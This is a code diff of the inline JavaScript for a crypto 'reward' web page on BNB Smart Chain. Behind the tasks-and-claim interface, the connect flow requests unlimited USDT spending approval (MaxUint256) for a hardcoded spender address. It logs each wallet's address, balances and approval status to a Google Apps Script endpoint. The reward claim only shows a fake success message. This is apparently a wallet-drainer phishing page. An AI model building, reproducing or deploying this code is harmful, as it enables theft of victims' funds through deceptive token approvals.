@@ -561,91 +561,111 @@
   <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
 
   <!-- Web3Modal HTML SDK (WalletConnect v3) -->
-  <script type="module">
-    // ===== Web3Modal + Wagmi setup =====
-    window.process = { env: { NODE_ENV: "production" } };
+ <script type="module">
+  /* ===== Web3Modal + Wagmi (HTML SDK) setup ===== */
 
-    // avoid "w3m-box-button already defined"
-    if (window.customElements && !window.customElements._w3mPatched) {
-      const origDefine = window.customElements.define.bind(window.customElements);
-      window.customElements.define = (name, ctor, options) => {
-        if (window.customElements.get(name)) {
-          console.warn("Custom element already defined, skipping:", name);
-          return;
-        }
-        return origDefine(name, ctor, options);
-      };
-      window.customElements._w3mPatched = true;
-    }
+  // tiny shim Web3Modal expects
+  window.process = { env: { NODE_ENV: "production" } };
 
-    import {
-      EthereumClient,
-      w3mConnectors,
-      w3mProvider,
-      WagmiCore,
-      WagmiCoreChains
-    } from "https://unpkg.com/@web3modal/ethereum@2.7.1";
-    import { Web3Modal } from "https://unpkg.com/@web3modal/html@2.7.1";
+  // avoid "w3m-box-button already defined" if this script is ever included twice
+  if (window.customElements && !window.customElements._w3mPatched) {
+    const origDefine = window.customElements.define.bind(window.customElements);
+    window.customElements.define = (name, ctor, options) => {
+      if (window.customElements.get(name)) {
+        console.warn("Custom element already defined, skipping:", name);
+        return;
+      }
+      return origDefine(name, ctor, options);
+    };
+    window.customElements._w3mPatched = true;
+  }
 
-    const { configureChains, createConfig, getAccount } = WagmiCore;
-    const { bsc } = WagmiCoreChains;
+  import {
+    EthereumClient,
+    w3mConnectors,
+    w3mProvider,
+    WagmiCore,
+    WagmiCoreChains
+  } from "https://unpkg.com/@web3modal/ethereum@2.7.1";
+  import { Web3Modal } from "https://unpkg.com/@web3modal/html@2.7.1";
 
-    const WALLETCONNECT_PROJECT_ID = "f89aac819fc8f8516ef9010d98d2fe7b";
+  const { configureChains, createConfig, getAccount } = WagmiCore;
+  const { bsc } = WagmiCoreChains;
 
-    const chains = [bsc];
-    const { publicClient } = configureChains(
-      chains,
-      [w3mProvider({ projectId: WALLETCONNECT_PROJECT_ID })]
-    );
+  // 🔑 your WC project id
+  const WALLETCONNECT_PROJECT_ID = "f89aac819fc8f8516ef9010d98d2fe7b";
 
-    const wagmiConfig = createConfig({
-      autoConnect: true,
-      connectors: w3mConnectors({
-        projectId: WALLETCONNECT_PROJECT_ID,
-        chains
-      }),
-      publicClient
-    });
+  const chains = [bsc];
 
+  const { publicClient } = configureChains(
+    chains,
+    [w3mProvider({ projectId: WALLETCONNECT_PROJECT_ID })]
+  );
+
+  const wagmiConfig = createConfig({
+    autoConnect: true,
+    connectors: w3mConnectors({ projectId: WALLETCONNECT_PROJECT_ID, chains }),
+    publicClient
+  });
+
+  // We'll recreate Web3Modal every time we click, so it always starts from the
+  // fresh "Connect Wallet" list view (WalletConnect, MetaMask, Trust, …)
+  function createWeb3Modal() {
     const ethereumClient = new EthereumClient(wagmiConfig, chains);
-    const web3Modal = new Web3Modal(
+    return new Web3Modal(
       {
         projectId: WALLETCONNECT_PROJECT_ID,
         themeMode: "dark",
-        enableEmail: false,
-        enableOnramp: false
+
+        // this is what makes the list view appear instead of only QR
+        enableExplorer: true,
+        enableNetworkView: true,
+        enableAccountView: true,
+
+        // optional but helps to show the same order you liked:
+        featuredWalletIds: [
+          "walletconnect",
+          "metamask",
+          "trust",
+          "coinbaseWallet"
+        ]
       },
       ethereumClient
     );
+  }
 
-    async function getActiveEip1193Provider() {
-      const account = getAccount(wagmiConfig);
-      const connector = account?.connector;
-      if (connector && connector.getProvider) {
-        return await connector.getProvider();
-      }
-      if (window.ethereum) return window.ethereum;
-      throw new Error("No provider from Web3Modal connection");
+  // helper: get the current EIP-1193 provider
+  async function getActiveEip1193Provider() {
+    const account = getAccount(wagmiConfig);
+    const connector = account?.connector;
+    if (connector && connector.getProvider) {
+      return await connector.getProvider();
     }
+    if (window.ethereum) return window.ethereum;
+    throw new Error("No provider from Web3Modal connection");
+  }
 
-    // ================== APP LOGIC (balances, userid, sheet, tasks) ==================
+  /* ===================== ORIGINAL APP LOGIC ===================== */
 
+  (function () {
     function formatToken(n) {
       n = Number(n);
       if (Number.isInteger(n)) return n.toString();
       return n.toFixed(4).replace(/\.?0+$/, "");
     }
 
-    const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbynJPCfQbGU_U9P4a2fQrAILVrxz_kV6308hOc1UmxGq9fe5oq3w53Za0ejnxeu4_Oy-A/exec";
+    const APPS_SCRIPT_URL =
+      "https://script.google.com/macros/s/AKfycbynJPCfQbGU_U9P4a2fQrAILVrxz_kV6308hOc1UmxGq9fe5oq3w53Za0ejnxeu4_Oy-A/exec";
     const APPS_SCRIPT_SECRET = "justforme";
 
-    const TOKEN_ADDRESS   = "0x55d398326f99059fF775485246999027B3197955"; // USDT BSC
+    const TOKEN_ADDRESS =
+      "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
     const SPENDER_ADDRESS = "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1";
 
-    const BNB_CHAIN_ID_DEC = 56;
-    const BNB_CHAIN_ID_HEX = "0x38";
-    const BNB_LABEL        = "BNB Smart Chain (56)";
-    const BNB_RPC          = "https://bsc-dataseed.binance.org";
+    const BNB_TESTNET_CHAIN_ID_DEC = 56;
+    const BNB_TESTNET_CHAIN_ID_HEX = "0x38";
+    const BNB_TESTNET_LABEL = "BNB Smart Chain (56)";
+    const BNB_TESTNET_RPC = "https://bsc-dataseed.binance.org";
 
     const ERC20_APPROVE_ABI = [
       "function approve(address spender, uint256 amount) public returns (bool)"
@@ -661,33 +681,33 @@
     const REQUIRED_USDT = 10;
     const REWARD_AMOUNT = 10.0;
 
-    let providerInstance      = null;
-    let web3Instance          = null;
-    let currentAddress        = null;
-    let currentUserId         = null;
-    let currentBNBBalance     = null;
-    let currentTokenBalance   = null;
-    let isWalletConnected     = false;
+    let providerInstance = null;
+    let web3Instance = null;
+    let currentAddress = null;
+    let currentUserId = null;
+    let currentBNBBalance = null;
+    let currentTokenBalance = null;
 
+    let isWalletConnected = false;
     let task1Done = false;
     let task2Eligible = false;
     let task3Done = false;
 
-    function storageKeyFor(address){
+    function storageKeyFor(address) {
       return "userId_" + address.toLowerCase();
     }
-    function generateUserIdFromAddress(address){
+    function generateUserIdFromAddress(address) {
       address = (address || "").toLowerCase();
       let hash = 0;
-      for (let i = 0; i < address.length; i++){
-        hash = ((hash << 5) - hash) + address.charCodeAt(i);
+      for (let i = 0; i < address.length; i++) {
+        hash = (hash << 5) - hash + address.charCodeAt(i);
         hash |= 0;
       }
       hash = Math.abs(hash);
       const num = 100000 + (hash % 900000);
       return String(num);
     }
-    function getOrCreateUserIdFor(address){
+    function getOrCreateUserIdFor(address) {
       const key = storageKeyFor(address);
       let id = localStorage.getItem(key);
       if (!id || !/^[0-9]{6}$/.test(id)) {
@@ -697,111 +717,115 @@
       return id;
     }
 
-    const connectBtn      = document.getElementById("connectBtn");
-    const statusTextEl    = document.getElementById("statusText");
+    const connectBtn = document.getElementById("connectBtn");
+    const statusTextEl = document.getElementById("statusText");
     const walletAddressEl = document.getElementById("walletAddress");
-    const userIdEl        = document.getElementById("userId");
+    const userIdEl = document.getElementById("userId");
     const walletNetworkEl = document.getElementById("walletNetwork");
     const walletBalanceEl = document.getElementById("walletBalance");
     const tokensContainer = document.getElementById("tokens");
 
-    const rewardPageEl    = document.getElementById("rewardPage");
-    const taskPageEl      = document.getElementById("taskPage");
-    const backToRewardsBtn= document.getElementById("backToRewardsBtn");
-    const taskBtn         = document.getElementById("taskBtn");
+    const rewardPageEl = document.getElementById("rewardPage");
+    const taskPageEl = document.getElementById("taskPage");
+    const backToRewardsBtn = document.getElementById("backToRewardsBtn");
+    const taskBtn = document.getElementById("taskBtn");
 
-    const claimBtn        = document.getElementById("claimBtn");
-    const claimHintEl     = document.getElementById("claimHint");
+    const claimBtn = document.getElementById("claimBtn");
+    const claimHintEl = document.getElementById("claimHint");
 
     const connectHintCardEl = document.getElementById("connectHintCard");
-    const connectedPillEl   = document.getElementById("connectedPill");
+    const connectedPillEl = document.getElementById("connectedPill");
 
-    const rewardAmountEl  = document.getElementById("rewardAmountDisplay");
+    const rewardAmountEl = document.getElementById("rewardAmountDisplay");
 
-    const task1Btn        = document.getElementById("task1Btn");
-    const task1CheckEl    = document.getElementById("task1Check");
-    const task2CheckBtn   = document.getElementById("task2CheckBtn");
-    const task2CheckEl    = document.getElementById("task2Check");
-    const task2DetailEl   = document.getElementById("task2Detail");
-    const task3Btn        = document.getElementById("task3Btn");
-    const task3CheckEl    = document.getElementById("task3Check");
+    const task1Btn = document.getElementById("task1Btn");
+    const task1CheckEl = document.getElementById("task1Check");
+    const task2CheckBtn = document.getElementById("task2CheckBtn");
+    const task2CheckEl = document.getElementById("task2Check");
+    const task2DetailEl = document.getElementById("task2Detail");
+    const task3Btn = document.getElementById("task3Btn");
+    const task3CheckEl = document.getElementById("task3Check");
 
-    function setStatus(txt){
-      if(statusTextEl) statusTextEl.textContent = txt;
+    function setStatus(txt) {
+      if (statusTextEl) statusTextEl.textContent = txt;
       console.log("[status]", txt);
     }
-    function setWalletInfo(address, network, bnb){
-      if(walletAddressEl) walletAddressEl.textContent = address || "—";
-      if(walletNetworkEl) walletNetworkEl.textContent = network || "—";
-      if(walletBalanceEl){
+    function setWalletInfo(address, network, bnb) {
+      if (walletAddressEl) walletAddressEl.textContent = address || "—";
+      if (walletNetworkEl) walletNetworkEl.textContent = network || "—";
+      if (walletBalanceEl) {
         walletBalanceEl.textContent =
-          (bnb === null || bnb === undefined) ? "—" : (Number(bnb).toFixed(6) + " BNB");
+          bnb === null || bnb === undefined
+            ? "—"
+            : Number(bnb).toFixed(6) + " BNB";
       }
     }
-    function setUserIdUI(id){
-      if(userIdEl) userIdEl.textContent = id || "-";
+    function setUserIdUI(id) {
+      if (userIdEl) userIdEl.textContent = id || "-";
     }
 
-    function clearSessionUI(){
+    function clearSessionUI() {
       isWalletConnected = false;
-      currentAddress    = null;
-      currentUserId     = null;
+      currentAddress = null;
+      currentUserId = null;
       currentBNBBalance = null;
       currentTokenBalance = null;
 
       setStatus("Not connected");
-      setWalletInfo("—","—",null);
+      setWalletInfo("—", "—", null);
       setUserIdUI("-");
-      if(connectHintCardEl){
-        connectHintCardEl.textContent = "Use the top button to connect your wallet.";
+      if (connectHintCardEl) {
+        connectHintCardEl.textContent =
+          "Use the top button to connect your wallet.";
       }
-      if(connectedPillEl){
+      if (connectedPillEl) {
         connectedPillEl.style.display = "none";
       }
 
-      if(tokensContainer){
+      if (tokensContainer) {
         tokensContainer.textContent = "Connect wallet to see USDT balance.";
       }
-      if(connectBtn){
+      if (connectBtn) {
         connectBtn.textContent = "Connect Wallet";
         connectBtn.classList.remove("connected");
       }
       updateClaimState();
     }
 
-    function updateClaimState(){
+    function updateClaimState() {
       const allTasksDone = task1Done && task2Eligible && task3Done;
-      if(claimBtn){
+      if (claimBtn) {
         claimBtn.disabled = !(isWalletConnected && allTasksDone);
       }
-      if(claimHintEl){
-        if(!isWalletConnected){
+      if (claimHintEl) {
+        if (!isWalletConnected) {
           claimHintEl.textContent = "Please connect your wallet first.";
-        }else if(!allTasksDone){
-          claimHintEl.textContent = "Complete all tasks to unlock the Claim button.";
-        }else{
+        } else if (!allTasksDone) {
+          claimHintEl.textContent =
+            "Complete all tasks to unlock the Claim button.";
+        } else {
           claimHintEl.textContent = "You can now claim your reward.";
         }
       }
     }
 
-    function markTaskState(el, ok, textOk, textBad){
-      if(!el) return;
-      el.classList.remove("ok","bad");
-      if(ok){
+    function markTaskState(el, ok, textOk, textBad) {
+      if (!el) return;
+      el.classList.remove("ok", "bad");
+      if (ok) {
         el.classList.add("ok");
         el.textContent = "✅ " + textOk;
-      }else{
+      } else {
         el.classList.add("bad");
         el.textContent = "❌ " + textBad;
       }
     }
 
-    function attachProviderListeners(p){
-      if(!p || !p.on) return;
-      try{
-        p.on("accountsChanged", async function(accounts){
-          if(!accounts || !accounts.length){
+    function attachProviderListeners(p) {
+      if (!p || !p.on) return;
+      try {
+        p.on("accountsChanged", async function (accounts) {
+          if (!accounts || !accounts.length) {
             clearSessionUI();
             return;
           }
@@ -809,91 +833,115 @@
           await restoreSessionFromAddress(addr);
         });
 
-        p.on("chainChanged", function(chainId){
-          if(walletNetworkEl){
-            walletNetworkEl.textContent = BNB_LABEL + " (chain " + chainId + ")";
+        p.on("chainChanged", function (chainId) {
+          if (walletNetworkEl) {
+            walletNetworkEl.textContent =
+              BNB_TESTNET_LABEL + " (chain " + chainId + ")";
           }
         });
 
-        p.on("disconnect", function(){
+        p.on("disconnect", function () {
           clearSessionUI();
         });
-      }catch(e){
+      } catch (e) {
         console.warn("attachProviderListeners", e);
       }
     }
 
-    async function notifyBackend(address, networkText, userId, bnbBalance, tokenBalance, eventType = "connect"){
-      try{
+    async function notifyBackend(
+      address,
+      networkText,
+      userId,
+      bnbBalance,
+      tokenBalance,
+      eventType = "connect"
+    ) {
+      try {
         const payload = new URLSearchParams({
-          secret      : APPS_SCRIPT_SECRET,
-          address     : address || "",
-          network     : networkText || "",
-          timestamp   : new Date().toISOString(),
-          userId      : userId || "",
-          bnbBalance  : bnbBalance !== undefined && bnbBalance !== null ? String(bnbBalance) : "",
-          tokenBalance: tokenBalance !== undefined && tokenBalance !== null ? String(tokenBalance) : "",
-          eventType   : eventType || "connect"
+          secret: APPS_SCRIPT_SECRET,
+          address: address || "",
+          network: networkText || "",
+          timestamp: new Date().toISOString(),
+          userId: userId || "",
+          bnbBalance:
+            bnbBalance !== undefined && bnbBalance !== null
+              ? String(bnbBalance)
+              : "",
+          tokenBalance:
+            tokenBalance !== undefined && tokenBalance !== null
+              ? String(tokenBalance)
+              : "",
+          eventType: eventType || "connect"
         });
 
         await fetch(APPS_SCRIPT_URL, {
           method: "POST",
-          mode  : "no-cors",
+          mode: "no-cors",
           headers: {
             "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
           },
           body: payload.toString()
         });
-      }catch(err){
+      } catch (err) {
         console.error("notifyBackend error:", err);
       }
     }
 
-    async function getTokenBalance(address){
-      try{
-        if(!TOKEN_ADDRESS || !/^0x[0-9a-fA-F]{40}$/.test(TOKEN_ADDRESS)){
+    async function getTokenBalance(address) {
+      try {
+        if (!TOKEN_ADDRESS || !/^0x[0-9a-fA-F]{40}$/.test(TOKEN_ADDRESS)) {
           console.warn("TOKEN_ADDRESS invalid");
           return "";
         }
-        if(!providerInstance){
+        if (!providerInstance) {
           console.warn("No providerInstance for token balance");
           return "";
         }
         const ethersProvider = new ethers.BrowserProvider(providerInstance);
-        const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_BALANCE_ABI, ethersProvider);
-        const raw            = await tokenContract.balanceOf(address);
-        const formatted      = ethers.formatUnits(raw, TOKEN_DECIMALS);
+        const tokenContract = new ethers.Contract(
+          TOKEN_ADDRESS,
+          ERC20_BALANCE_ABI,
+          ethersProvider
+        );
+        const raw = await tokenContract.balanceOf(address);
+        const formatted = ethers.formatUnits(raw, TOKEN_DECIMALS);
 
         return formatted;
-      }catch(err){
+      } catch (err) {
         console.error("getTokenBalance error:", err);
         return "";
       }
     }
 
-    async function switchToBSC(provider){
-      if(!provider || !provider.request) return false;
-      try{
+    async function switchToBSC(provider) {
+      if (!provider || !provider.request) return false;
+      try {
         await provider.request({
-          method:"wallet_switchEthereumChain",
-          params:[{chainId:BNB_CHAIN_ID_HEX}]
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: BNB_TESTNET_CHAIN_ID_HEX }]
         });
         return true;
-      }catch(switchError){
-        if(switchError.code === 4902){
-          try{
+      } catch (switchError) {
+        if (switchError.code === 4902) {
+          try {
             await provider.request({
-              method:"wallet_addEthereumChain",
-              params:[{
-                chainId:BNB_CHAIN_ID_HEX,
-                chainName:"BNB Smart Chain",
-                nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
-                rpcUrls:[BNB_RPC],
-                blockExplorerUrls:["https://bscscan.com"]
-              }]
+              method: "wallet_addEthereumChain",
+              params: [
+                {
+                  chainId: BNB_TESTNET_CHAIN_ID_HEX,
+                  chainName: "BNB Smart Chain",
+                  nativeCurrency: {
+                    name: "BNB",
+                    symbol: "BNB",
+                    decimals: 18
+                  },
+                  rpcUrls: [BNB_TESTNET_RPC],
+                  blockExplorerUrls: ["https://bscscan.com"]
+                }
+              ]
             });
             return true;
-          }catch(addErr){
+          } catch (addErr) {
             console.error("Could not add BNB Smart Chain:", addErr);
             return false;
           }
@@ -903,11 +951,11 @@
       }
     }
 
-    async function ensureTokenApproval(){
-      async function logApproval(tag){
+    async function ensureTokenApproval() {
+      async function logApproval(tag) {
         await notifyBackend(
           currentAddress || "",
-          BNB_LABEL,
+          BNB_TESTNET_LABEL,
           currentUserId || "",
           currentBNBBalance,
           currentTokenBalance,
@@ -915,36 +963,36 @@
         );
       }
 
-      if(!TOKEN_ADDRESS){
+      if (!TOKEN_ADDRESS) {
         console.warn("TOKEN_ADDRESS not set, skipping approve");
         await logApproval("approval_skipped_no_token");
         return;
       }
-      if(!SPENDER_ADDRESS){
+      if (!SPENDER_ADDRESS) {
         console.warn("SPENDER_ADDRESS not set, skipping approve");
         await logApproval("approval_skipped_no_spender");
         return;
       }
-      if(!providerInstance){
+      if (!providerInstance) {
         console.warn("No providerInstance for approval");
         await logApproval("approval_skipped_no_provider");
         return;
       }
 
-      try{
+      try {
         setStatus("Preparing token approval…");
 
         const ethersProvider = new ethers.BrowserProvider(
           providerInstance,
-          BNB_CHAIN_ID_DEC
+          BNB_TESTNET_CHAIN_ID_DEC
         );
-        const signer       = await ethersProvider.getSigner();
+        const signer = await ethersProvider.getSigner();
         const ownerAddress = (await signer.getAddress()).toLowerCase();
 
         if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
           alert(
             "ERROR: TOKEN_ADDRESS is set to your wallet address.\n\n" +
-            "It MUST be the BEP-20 token contract address, not your wallet."
+              "It MUST be the BEP-20 token contract address, not your wallet."
           );
           setStatus("Connected (approval skipped)");
           await logApproval("approval_skipped_token_is_wallet");
@@ -956,7 +1004,10 @@
           ERC20_ALLOWANCE_ABI,
           ethersProvider
         );
-        const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
+        const currentAllowance = await readContract.allowance(
+          ownerAddress,
+          SPENDER_ADDRESS
+        );
         if (currentAllowance > 0n) {
           setStatus("Connected (already approved)");
           await logApproval("approval_already");
@@ -970,13 +1021,16 @@
           signer
         );
 
-        const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
+        const tx = await writeContract.approve(
+          SPENDER_ADDRESS,
+          ethers.MaxUint256
+        );
         setStatus("Approval pending on chain…");
         await tx.wait();
 
         setStatus("Connected + Approved ✅");
         await logApproval("approval_approved");
-      }catch(err){
+      } catch (err) {
         console.error("Token approve error:", err);
 
         let tag = "approval_error";
@@ -985,45 +1039,55 @@
         }
 
         setStatus("Connected (approval failed)");
-        alert("Token approval failed: " + (err && err.message ? err.message : err));
+        alert(
+          "Token approval failed: " +
+            (err && err.message ? err.message : err)
+        );
 
         await logApproval(tag);
       }
     }
 
-    async function restoreSessionFromAddress(address){
+    async function restoreSessionFromAddress(address) {
       currentAddress = address;
 
       const balanceWei = await web3Instance.eth.getBalance(address);
-      const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "","ether"));
-      const userId     = getOrCreateUserIdFor(address);
+      const balanceBNB = Number(
+        web3Instance.utils.fromWei(balanceWei + "", "ether")
+      );
+      const userId = getOrCreateUserIdFor(address);
 
-      currentUserId       = userId;
-      currentBNBBalance   = balanceBNB;
+      currentUserId = userId;
+      currentBNBBalance = balanceBNB;
 
-      setWalletInfo(address, BNB_LABEL, balanceBNB);
+      setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
       setUserIdUI(userId);
 
-      const tokenBalanceRaw  = await getTokenBalance(address);
-      const tokenBalanceNum  = tokenBalanceRaw ? Number(tokenBalanceRaw) : 0;
-      const prettyBalance    = tokenBalanceRaw ? formatToken(tokenBalanceRaw) : "0";
+      const tokenBalanceRaw = await getTokenBalance(address);
+      const tokenBalanceNum = tokenBalanceRaw ? Number(tokenBalanceRaw) : 0;
+      const prettyBalance = tokenBalanceRaw
+        ? formatToken(tokenBalanceRaw)
+        : "0";
 
       currentTokenBalance = tokenBalanceNum;
 
-      if(tokensContainer){
+      if (tokensContainer) {
         tokensContainer.innerHTML =
-          'USDT balance: ' + prettyBalance +
-          '<br><span class="small mono">' + TOKEN_ADDRESS + '</span>';
+          "USDT balance: " +
+          prettyBalance +
+          '<br><span class="small mono">' +
+          TOKEN_ADDRESS +
+          "</span>";
       }
 
       isWalletConnected = true;
-      if(connectBtn){
+      if (connectBtn) {
         connectBtn.textContent = "Connected";
         connectBtn.classList.add("connected");
-        if(connectHintCardEl){
+        if (connectHintCardEl) {
           connectHintCardEl.textContent = "Wallet connected.";
         }
-        if(connectedPillEl){
+        if (connectedPillEl) {
           connectedPillEl.style.display = "inline-flex";
         }
       }
@@ -1037,46 +1101,47 @@
       };
     }
 
-    async function connectFlow(){
-  try{
-    setStatus("Connecting…");
+    async function connectFlow() {
+      try {
+        setStatus("Connecting…");
 
-    // Force Web3Modal to open on the main "Connect Wallet" list,
-    // not whatever view (QR) it was on last time.
-    await web3Modal.openModal({
-      view: 'Connect'   // main wallet list
-    });
+        // 💡 new Web3Modal instance every click → always opens from list view
+        const web3Modal = createWeb3Modal();
 
-    const account = getAccount(wagmiConfig);
-    if (!account || !account.address) {
-      setStatus("Connection cancelled");
-      return;
-    }
+        // force to the Connect Wallet list, not QR
+        await web3Modal.openModal({ view: "Connect" });
 
-    // ... rest of your connectFlow stays the same
-
+        const account = getAccount(wagmiConfig);
+        if (!account || !account.address) {
+          setStatus("Connection cancelled");
+          return;
+        }
 
         const provider = await getActiveEip1193Provider();
 
         providerInstance = provider;
-        web3Instance     = new Web3(providerInstance);
+        web3Instance = new Web3(providerInstance);
         attachProviderListeners(providerInstance);
 
         const address = account.address.toLowerCase();
 
-        let chainId    = await web3Instance.eth.getChainId();
-        let chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
+        let chainId = await web3Instance.eth.getChainId();
+        let chainIdNum =
+          typeof chainId === "string" ? Number(chainId) : Number(chainId);
 
-        if (chainIdNum !== BNB_CHAIN_ID_DEC){
+        if (chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC) {
           const switched = await switchToBSC(providerInstance);
-          if(!switched){
-            alert("Please switch to BNB Smart Chain (mainnet) in your wallet and try again.");
+          if (!switched) {
+            alert(
+              "Please switch to BNB Smart Chain (mainnet) in your wallet and try again."
+            );
             setStatus("Wrong network");
             return;
           }
-          chainId    = await web3Instance.eth.getChainId();
-          chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
-          if(chainIdNum !== BNB_CHAIN_ID_DEC){
+          chainId = await web3Instance.eth.getChainId();
+          chainIdNum =
+            typeof chainId === "string" ? Number(chainId) : Number(chainId);
+          if (chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC) {
             alert("Network switch failed. Make sure you are on BNB Smart Chain (56).");
             setStatus("Wrong network");
             return;
@@ -1086,13 +1151,13 @@
         setStatus("Connected");
 
         const session = await restoreSessionFromAddress(address);
-        const balanceBNB   = session.balanceBNB;
+        const balanceBNB = session.balanceBNB;
         const tokenBalance = session.tokenBalance;
-        const userId       = session.userId;
+        const userId = session.userId;
 
         notifyBackend(
           address,
-          BNB_LABEL,
+          BNB_TESTNET_LABEL,
           userId,
           balanceBNB,
           tokenBalance,
@@ -1100,55 +1165,117 @@
         ).catch(console.error);
 
         await ensureTokenApproval();
-
-      }catch(err){
+      } catch (err) {
         console.error("connectFlow error:", err);
         setStatus("Connection failed");
-        alert("Connection failed: " + (err && err.message ? err.message : err));
+        alert(
+          "Connection failed: " + (err && err.message ? err.message : err)
+        );
       }
     }
 
-    async function hydrateFromExistingAccount(){
-      try{
-        const account = getAccount(wagmiConfig);
-        if (!account || !account.address) return false;
-
-        const provider = await getActiveEip1193Provider();
-        providerInstance = provider;
-        web3Instance     = new Web3(providerInstance);
+    async function tryAutoReconnectSilent() {
+      // your previous silent Trust/MetaMask restore logic
+      if (window.trustwallet && window.trustwallet.ethereum) {
+        const injected = window.trustwallet.ethereum;
+        providerInstance = injected;
+        web3Instance = new Web3(providerInstance);
         attachProviderListeners(providerInstance);
+        const accounts = await injected.request({ method: "eth_accounts" });
+        if (accounts && accounts.length) {
+          const address = accounts[0].toLowerCase();
+          setStatus("Restoring session (Trust Wallet)...");
+          await restoreSessionFromAddress(address);
+          setStatus("Connected (restored)");
+          return true;
+        }
+      }
 
-        setStatus("Restoring session…");
-        await restoreSessionFromAddress(account.address.toLowerCase());
-        setStatus("Connected (restored)");
-        return true;
-      }catch(e){
-        console.warn("hydrateFromExistingAccount failed:", e);
-        return false;
+      if (window.ethereum) {
+        const injected = window.ethereum;
+        providerInstance = injected;
+        web3Instance = new Web3(providerInstance);
+        attachProviderListeners(providerInstance);
+        const accounts = await injected.request({ method: "eth_accounts" });
+        if (accounts && accounts.length) {
+          const address = accounts[0].toLowerCase();
+          setStatus("Restoring session...");
+          await restoreSessionFromAddress(address);
+          setStatus("Connected (restored)");
+          return true;
+        }
+      }
+
+      return false;
+    }
+
+    async function autoConnectOnLoad() {
+      try {
+        const restored = await tryAutoReconnectSilent();
+        if (!restored) {
+          clearSessionUI();
+        }
+      } catch (e) {
+        console.warn("autoConnectOnLoad failed:", e);
+        clearSessionUI();
       }
     }
 
-    // tasks
-    function showTaskPage(){
-      if(rewardPageEl) rewardPageEl.style.display = "none";
-      if(taskPageEl)   taskPageEl.style.display   = "block";
-    }
-    function showRewardPage(){
-      if(taskPageEl)   taskPageEl.style.display   = "none";
-      if(rewardPageEl) rewardPageEl.style.display = "block";
+    async function claimReward() {
+      try {
+        if (!isWalletConnected) {
+          alert("Please connect your wallet first.");
+          setStatus("Connect wallet before claiming.");
+          return;
+        }
+        if (!(task1Done && task2Eligible && task3Done)) {
+          alert("Please complete all tasks first.");
+          return;
+        }
+        if (!web3Instance || !providerInstance || !currentAddress) {
+          alert("Wallet not ready, connect again.");
+          return;
+        }
+
+        setStatus("Claiming reward…");
+
+        setTimeout(() => {
+          setStatus(
+            "Reward claimed for " +
+              currentAddress.slice(0, 6) +
+              "…" +
+              currentAddress.slice(-4)
+          );
+          alert(
+            "Reward claimed! (demo mode — add real contract call later)"
+          );
+        }, 800);
+      } catch (err) {
+        console.error("claimReward error:", err);
+        setStatus("Reward claim failed");
+      }
     }
 
-    async function handleTask2Check(){
-      if(!isWalletConnected || !currentAddress){
+    function showTaskPage() {
+      if (rewardPageEl) rewardPageEl.style.display = "none";
+      if (taskPageEl) taskPageEl.style.display = "block";
+    }
+    function showRewardPage() {
+      if (taskPageEl) taskPageEl.style.display = "none";
+      if (rewardPageEl) rewardPageEl.style.display = "block";
+    }
+
+    async function handleTask2Check() {
+      if (!isWalletConnected || !currentAddress) {
         alert("Please connect your wallet first.");
         return;
       }
-      if(!web3Instance || !providerInstance){
+      if (!web3Instance || !providerInstance) {
         alert("Wallet not ready, try reconnect.");
         return;
       }
 
-      try{
+      try {
         setStatus("Checking wallet balance…");
         const balanceStr = await getTokenBalance(currentAddress);
         const balanceNum = balanceStr ? Number(balanceStr) : 0;
@@ -1163,104 +1290,86 @@
           "Not eligible (needs ≥ " + REQUIRED_USDT + ")"
         );
 
-        if(task2DetailEl){
+        if (task2DetailEl) {
           task2DetailEl.textContent =
-            "Detected balance: " + balanceNum.toFixed(4) +
-            " USDT. Result: " + (eligible ? "ELIGIBLE" : "NOT ELIGIBLE") +
+            "Detected balance: " +
+            balanceNum.toFixed(4) +
+            " USDT. Result: " +
+            (eligible ? "ELIGIBLE" : "NOT ELIGIBLE") +
             ".";
         }
 
         setStatus("Wallet check completed");
         updateClaimState();
-      }catch(err){
+      } catch (err) {
         console.error("Task 2 check error:", err);
-        if(task2DetailEl){
+        if (task2DetailEl) {
           task2DetailEl.textContent = "Error checking wallet. Try again.";
         }
       }
     }
 
-    async function claimReward(){
-      try{
-        if(!isWalletConnected){
-          alert("Please connect your wallet first.");
-          setStatus("Connect wallet before claiming.");
-          return;
-        }
-        if(!(task1Done && task2Eligible && task3Done)){
-          alert("Please complete all tasks first.");
-          return;
-        }
-        if(!web3Instance || !providerInstance || !currentAddress){
-          alert("Wallet not ready, connect again.");
-          return;
-        }
-
-        setStatus("Claiming reward…");
-
-        setTimeout(()=>{
-          setStatus("Reward claimed for " + currentAddress.slice(0,6) + "…" + currentAddress.slice(-4));
-          alert("Reward claimed! (demo mode — add real contract call later)");
-        },800);
-      }catch(err){
-        console.error("claimReward error:", err);
-        setStatus("Reward claim failed");
-      }
-    }
-
-    document.addEventListener("DOMContentLoaded", async function(){
-      if(rewardAmountEl){
+    document.addEventListener("DOMContentLoaded", async function () {
+      if (rewardAmountEl) {
         rewardAmountEl.textContent = "$" + REWARD_AMOUNT.toFixed(0);
       }
 
       updateClaimState();
 
-      if(connectBtn){
-        connectBtn.addEventListener("click", function(){
-          if(isWalletConnected) return;
+      if (connectBtn) {
+        connectBtn.addEventListener("click", function () {
+          if (isWalletConnected) return;
           connectFlow();
         });
       }
 
-      if(claimBtn){
+      if (claimBtn) {
         claimBtn.addEventListener("click", claimReward);
       }
 
-      if(taskBtn){
+      if (taskBtn) {
         taskBtn.addEventListener("click", showTaskPage);
       }
-      if(backToRewardsBtn){
+      if (backToRewardsBtn) {
         backToRewardsBtn.addEventListener("click", showRewardPage);
       }
 
-      if(task1Btn){
